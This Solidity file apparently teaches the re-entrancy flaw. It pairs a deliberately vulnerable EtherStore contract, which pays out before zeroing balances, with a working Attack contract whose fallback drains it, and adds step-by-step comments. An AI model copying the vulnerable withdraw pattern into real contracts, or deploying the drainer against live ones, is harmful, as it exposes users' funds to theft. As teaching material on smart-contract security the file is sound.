// SPDX-License-Identifier: MIT

/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

pragma solidity ^0.8;

contract EtherStore
{

    mapping(address => uint) public balances;

    function deposit() public payable
    {
        balances[msg.sender] += msg.value;
    }


    function withdraw() external
    {
         uint bal = balances[msg.sender];

        require(bal >= 0);

        (bool sent,) = msg.sender.call{value: bal}("");

        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint)
    {
        return address(this).balance;
    }
}



contract Attack
{
    EtherStore public etherstore;

    address public owner;

    address public target;

    constructor(address _target)
    {
        owner = msg.sender;
        etherstore = EtherStore(_target);
    }

    function attack() external payable
    {

        require(msg.value >= 1 ether);
        etherstore.deposit{value: 1 ether}();
        etherstore.withdraw();
    }

    fallback() external payable
    {
        if(address(etherstore).balance >= 1 ether){
            etherstore.withdraw();
        }
        
    }

    function getBalance() external view returns(uint)
    {
        return address(this).balance;
    }

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    function withdraw() external onlyOwner{
        payable(owner).transfer(address(this).balance);
    }


    
}